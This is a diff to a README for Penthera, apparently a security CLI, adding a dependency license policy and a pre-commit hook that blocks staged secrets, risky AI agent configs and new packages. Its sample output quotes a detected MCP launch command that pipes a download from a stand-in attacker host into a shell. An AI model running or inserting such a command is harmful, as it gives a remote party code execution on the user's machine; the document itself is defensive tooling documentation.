@@ -553,6 +553,111 @@ both. The one network use is npm talking to your configured registry, and
 Penthera prints which one; Penthera itself sends nothing. Workspaces and
 `file:` dependencies are not supported yet.
 
+### License policy
+
+```bash
+penthera deps --license-policy permissive        # or weak-copyleft-ok, no-agpl
+penthera deps --license-policy legal/policy.json # a file with a "licenses" section
+```
+
+Without the flag, `penthera deps` applies the `licenses` section of
+`penthera.policy.json` when there is one:
+
+```json
+{
+  "licenses": {
+    "preset": "permissive",
+    "allow": ["Python-2.0"],
+    "deny": ["WTFPL"],
+    "allowPackages": ["@acme/*", "sharp@0.33.5"],
+    "unknown": "warn"
+  }
+}
+```
+
+| Preset | Allows |
+|---|---|
+| `permissive` | MIT, ISC, BSD, Apache-2.0, 0BSD, Unlicense, CC0, Zlib, BlueOak and similar. Everything else breaches |
+| `weak-copyleft-ok` | `permissive` plus LGPL, MPL, EPL, CDDL and Artistic-2.0 |
+| `no-agpl` | Anything except AGPL and SSPL (network copyleft) |
+
+Licenses come from the lockfile (npm records them in v2 and v3), else from
+the installed `package.json`. Expressions are parsed as SPDX:
+`MIT OR GPL-3.0-only` passes `permissive` because one branch is enough, while
+`MIT AND GPL-3.0-only` does not. Deprecated ids (`GPL-3.0`, `GPL-2.0+`) are
+matched to their current form, so a deny of `AGPL-3.0-only` also catches a
+package that says `AGPL-3.0`. A breach and `UNLICENSED` (no rights granted)
+are high. A missing, custom (`SEE LICENSE IN ...`) or non-SPDX license is
+medium, or high with `"unknown": "block"`. `allowPackages` exempts packages your
+legal review has cleared. Findings use category `license` and appear in every
+output format, and `--sbom` now records each component's license.
+
+## Block it before it's committed
+
+Once a secret is pushed, rotating it is the only fix. The pre-commit hook runs
+the checks that matter on what you are about to commit, and nothing else:
+
+```bash
+penthera hook install     # writes .git/hooks/pre-commit; an existing hook is kept and runs first
+penthera hook run         # what the hook runs; try it on staged changes
+penthera hook uninstall   # removes it and puts your old hook back
+```
+
+On staged content only (the git index, not your working tree):
+
+- secrets and AI provider keys in staged files;
+- `penthera agents` rules on staged `.mcp.json`, `CLAUDE.md`, `AGENTS.md`,
+  `.cursor/`, `.claude/` and `skills/`;
+- when `package-lock.json` is staged, the capability diff against HEAD's
+  lockfile and the license policy, for the packages this commit adds.
+
+```
+  ✗ penthera blocked this commit: 2 findings at high or above (2 staged files, 1 agent config, 0.1s)
+
+  ✗ CRITICAL .mcp.json  MCP server "x" launches by downloading and running code  id b5914a44a2058da9
+      → Launch command contains a download piped to a shell: `curl https://evil.example/x.sh | sh`.
+  ✗ CRITICAL config.js:1  Anthropic API key in source  sk-a…AAAA  id 7a0eb6998ff38787
+      → Load it from an env var or secret store and unstage the file; rotate it if it was ever pushed or shared.
+
+  Fix and `git add` again. A false positive? Add it to penthera.suppress.json:
+    { "version": 1, "suppress": [{ "id": "b5914a44a2058da9", "reason": "why this is safe" }] }
+  To skip the check for one commit: git commit --no-verify (the finding still ships)
+```
+
+It blocks on high and critical by default and takes about 0.1 to 0.5 s.
+Configure it in `penthera.policy.json`:
+
+```json
+{ "hook": { "blockOn": "high", "ignore": ["tests/fixtures/**"],
+            "checks": { "secrets": true, "agents": true, "deps": true, "licenses": true } } }
+```
+
+If husky or lefthook manage your hooks (`core.hooksPath` is set),
+`penthera hook install` says so instead of overwriting them. Add one line to
+that tool instead:
+
+```bash
+# husky
+echo "npx --no-install penthera hook run" >> .husky/pre-commit
+```
+
+```yaml
+# lefthook.yml
+pre-commit:
+  commands:
+    penthera:
+      run: npx --no-install penthera hook run
+```
+
+```yaml
+# .pre-commit-config.yaml (pre-commit.com)
+repos:
+  - repo: https://github.com/danoszz/penthera
+    rev: <tag or sha>
+    hooks:
+      - id: penthera
+```
+
 ---
 
 ## Compliance: NIS2 and the cyberwetgeving
